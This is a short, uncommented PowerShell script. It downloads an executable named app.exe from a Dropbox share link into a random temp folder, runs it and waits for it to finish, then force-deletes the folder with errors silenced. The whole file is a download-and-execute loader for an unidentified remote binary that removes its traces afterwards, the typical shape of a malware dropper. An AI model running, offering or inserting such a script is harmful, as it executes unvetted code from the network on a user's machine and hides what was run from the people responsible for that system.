$url = "https://www.dropbox.com/scl/fi/ffhayfxoponlb0j7r0590/app.exe?rlkey=647ndk2z1vad36x2z5cuf27bc&st=hwj1rifa&dl=1"  
$tempdir = "$env:TEMP\$(New-Guid)" 
mkdir $tempdir | Out-Null
$file = "$tempdir\app.exe" 

try {
    irm -Uri $url -OutFile $file -ErrorAction Stop 
    $proc = Start-Process $file -PassThru -Wait 
    Write-Host "Process exited with code: $($proc.ExitCode)"  
} catch {
    Write-Error "An error occurred: $_"  
} finally {
    ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue  
}
